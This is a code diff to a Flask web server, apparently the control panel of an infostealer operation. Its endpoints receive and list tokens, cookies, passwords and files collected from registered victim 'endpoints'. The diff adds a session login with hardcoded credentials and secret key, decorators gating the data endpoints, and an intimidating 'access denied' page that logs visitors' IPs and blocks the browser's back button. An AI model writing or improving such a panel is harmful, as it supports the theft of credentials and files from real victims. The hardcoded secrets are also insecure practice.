@@ -8,9 +8,30 @@ import os
 import json
 import base64
 from datetime import datetime
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, session, redirect, url_for
 
 app = Flask(__name__)
+app.secret_key = 'LEALDADE_SECRET_KEY_2024_SECURE_SESSION'
+
+# Middleware de proteção
+def require_login(f):
+    from functools import wraps
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if 'logged_in' not in session:
+            # Registrar tentativa de acesso não autorizado
+            client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR', 'unknown'))
+            user_agent = request.headers.get('User-Agent', 'unknown')
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            
+            # Log da tentativa (pode ser salvo em arquivo ou banco depois)
+            print(f"[SECURITY] Unauthorized access attempt from {client_ip} at {timestamp}")
+            print(f"[SECURITY] User-Agent: {user_agent}")
+            
+            # Retornar página de aviso
+            return WARNING_TEMPLATE.replace('{{TIMESTAMP}}', timestamp).replace('{{CLIENT_IP}}', client_ip).replace('{{USER_AGENT}}', user_agent[:100] + '...' if len(user_agent) > 100 else user_agent)
+        return f(*args, **kwargs)
+    return decorated_function
 
 # CORS manual
 @app.after_request
@@ -31,6 +52,218 @@ endpoint_passwords = {}
 endpoint_files = {}
 full_reports = {}
 uploaded_files = {}
+
+# Template de aviso para tentativas de acesso não autorizado
+WARNING_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acesso Negado - LEALDADE SYSTEM</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #000000;
+            min-height: 100vh;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow: hidden;
+            position: relative;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -webkit-touch-callout: none;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(127, 29, 29, 0.1), rgba(239, 68, 68, 0.05));
+            z-index: 1;
+        }
+        
+        .warning-container {
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(239, 68, 68, 0.3);
+            border-radius: 20px;
+            padding: 50px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            z-index: 10;
+            animation: warningPulse 2s infinite;
+        }
+        
+        @keyframes warningPulse {
+            0%, 100% { box-shadow: 0 0 30px rgba(239, 68, 68, 0.2); }
+            50% { box-shadow: 0 0 50px rgba(239, 68, 68, 0.4); }
+        }
+        
+        .warning-icon {
+            font-size: 4em;
+            color: #ef4444;
+            margin-bottom: 20px;
+            animation: shake 0.5s infinite;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        
+        .warning-title {
+            font-size: 2em;
+            color: #ef4444;
+            margin-bottom: 15px;
+            font-weight: 700;
+            text-shadow: 0 0 20px rgba(239, 68, 68, 0.5);
+        }
+        
+        .warning-message {
+            font-size: 1.2em;
+            color: #fca5a5;
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+        
+        .warning-subtitle {
+            font-size: 1em;
+            color: #9ca3af;
+            margin-bottom: 30px;
+            font-style: italic;
+        }
+        
+        .warning-details {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .warning-details p {
+            color: #fca5a5;
+            margin-bottom: 10px;
+            font-size: 0.9em;
+        }
+        
+        .warning-details p:last-child {
+            margin-bottom: 0;
+        }
+        
+        .redirect-btn {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 1.1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .redirect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(239, 68, 68, 0.3);
+        }
+        
+        .countdown {
+            color: #fca5a5;
+            font-size: 1.1em;
+            margin-top: 20px;
+            font-weight: 600;
+        }
+        
+        .access-log {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            font-size: 0.8em;
+            color: #fca5a5;
+            z-index: 20;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning-container">
+        <div class="warning-icon">⚠️</div>
+        <h1 class="warning-title">ACESSO NEGADO</h1>
+        <p class="warning-message">Não vai ser fácil assim...</p>
+        <p class="warning-subtitle">Tentativa de acesso não autorizado detectada</p>
+        
+        <div class="warning-details">
+            <p>🔒 Esta área é protegida por autenticação</p>
+            <p>🚫 Tentativa de acesso direto bloqueada</p>
+            <p>📡 IP e informações registradas no sistema</p>
+            <p>⏰ Timestamp: {{TIMESTAMP}}</p>
+        </div>
+        
+        <button class="redirect-btn" onclick="redirectToLogin()">IR PARA LOGIN</button>
+        <div class="countdown">Redirecionando em <span id="countdown">10</span> segundos...</div>
+    </div>
+    
+    <div class="access-log">
+        <strong>LOG DE SEGURANÇA:</strong><br>
+        IP: {{CLIENT_IP}}<br>
+        User-Agent: {{USER_AGENT}}<br>
+        Tentativa: {{TIMESTAMP}}
+    </div>
+    
+    <script>
+        let countdown = 10;
+        const countdownElement = document.getElementById('countdown');
+        
+        const interval = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = countdown;
+            
+            if (countdown <= 0) {
+                clearInterval(interval);
+                redirectToLogin();
+            }
+        }, 1000);
+        
+        function redirectToLogin() {
+            window.location.href = '/';
+        }
+        
+        // Prevenir voltar
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+        
+        // Desabilitar atalhos
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
+                e.preventDefault();
+                redirectToLogin();
+            }
+        });
+    </script>
+</body>
+</html>
+"""
 
 # Template HTML robusto
 HTML_TEMPLATE = """
@@ -1030,9 +1263,22 @@ LOGIN_TEMPLATE = """
             btnText.textContent = 'VERIFICANDO...';
             loginBtn.disabled = true;
             
-            // Simular verificação
-            setTimeout(() => {
-                if (username === 'lealdade' && password === 'lealdade') {
+            try {
+                // Fazer requisição real para API
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
                     // Sucesso
                     successMsg.textContent = '✓ Acesso concedido! Redirecionando...';
                     successMsg.style.display = 'block';
@@ -1042,11 +1288,11 @@ LOGIN_TEMPLATE = """
                     
                     // Redirecionar após 2 segundos
                     setTimeout(() => {
-                        window.location.href = '/dashboard';
+                        window.location.href = result.redirect || '/dashboard';
                     }, 2000);
                 } else {
                     // Erro
-                    errorMsg.textContent = '✗ Credenciais inválidas! Tente novamente.';
+                    errorMsg.textContent = '✗ ' + (result.error || 'Credenciais inválidas! Tente novamente.');
                     errorMsg.style.display = 'block';
                     
                     loginBtn.classList.remove('loading');
@@ -1063,7 +1309,21 @@ LOGIN_TEMPLATE = """
                     passwordInput.value = '';
                     passwordInput.focus();
                 }
-            }, 1500);
+            } catch (error) {
+                // Erro de conexão
+                errorMsg.textContent = '✗ Erro de conexão! Tente novamente.';
+                errorMsg.style.display = 'block';
+                
+                loginBtn.classList.remove('loading');
+                btnText.textContent = 'TENTAR NOVAMENTE';
+                loginBtn.style.background = 'linear-gradient(135deg, #ef4444, #dc2626)';
+                
+                setTimeout(() => {
+                    loginBtn.style.background = 'linear-gradient(135deg, #4c1d95, #6b21a8, #7c3aed)';
+                    btnText.textContent = 'ENTRAR';
+                    loginBtn.disabled = false;
+                }, 2000);
+            }
         });
     </script>
 </body>
@@ -1076,12 +1336,35 @@ def index():
     """Página de login (principal)"""
     return LOGIN_TEMPLATE
 
+@app.route('/login', methods=['POST'])
+def login():
+    """Processa login"""
+    data = request.get_json()
+    username = data.get('username', '')
+    password = data.get('password', '')
+    
+    if username == 'lealdade' and password == 'lealdade':
+        session['logged_in'] = True
+        session['username'] = username
+        session.permanent = True
+        return jsonify({'success': True, 'redirect': '/dashboard'})
+    else:
+        return jsonify({'success': False, 'error': 'Credenciais inválidas'}), 401
+
+@app.route('/logout')
+def logout():
+    """Logout"""
+    session.clear()
+    return redirect(url_for('index'))
+
 @app.route('/dashboard')
+@require_login
 def dashboard():
     """Página principal do painel"""
-    return HTML_TEMPLATE
+    return HTML_TEMPLATE.replace('{{UPDATE_TIME}}', datetime.now().strftime('%H:%M:%S'))
 
-@app.route('/api/register', methods=['POST', 'OPTIONS'])
+@app.route('/api/register', methods=['POST'])
+@require_login
 def register_endpoint():
     """Registra novo endpoint"""
     if request.method == 'OPTIONS':
@@ -1111,31 +1394,37 @@ def register_endpoint():
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/tokens_data')
+@require_login
 def get_tokens_data():
     """Retorna todos os tokens coletados"""
     return jsonify(endpoint_tokens)
 
 @app.route('/api/cookies_data')
+@require_login
 def get_cookies_data():
     """Retorna todos os cookies coletados"""
     return jsonify(endpoint_cookies)
 
 @app.route('/api/passwords_data')
+@require_login
 def get_passwords_data():
     """Retorna todas as senhas coletadas"""
     return jsonify(endpoint_passwords)
 
 @app.route('/api/files_data')
+@require_login
 def get_files_data():
     """Retorna todos os arquivos recebidos"""
     return jsonify(endpoint_files)
 
 @app.route('/api/metrics_data')
+@require_login
 def get_metrics_data():
     """Retorna todas as métricas"""
     return jsonify(metrics_data)
 
 @app.route('/api/tokens', methods=['POST'])
+@require_login
 def receive_tokens():
     """Recebe tokens de um endpoint"""
     try:
@@ -1155,6 +1444,7 @@ def receive_tokens():
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/cookies', methods=['POST'])
+@require_login
 def receive_cookies():
     """Recebe cookies de um endpoint"""
     try:
@@ -1174,6 +1464,7 @@ def receive_cookies():
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/passwords', methods=['POST'])
+@require_login
 def receive_passwords():
     """Recebe senhas de um endpoint"""
     try:
@@ -1193,6 +1484,7 @@ def receive_passwords():
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/files', methods=['POST'])
+@require_login
 def receive_files():
     """Recebe arquivos de um endpoint"""
     try:
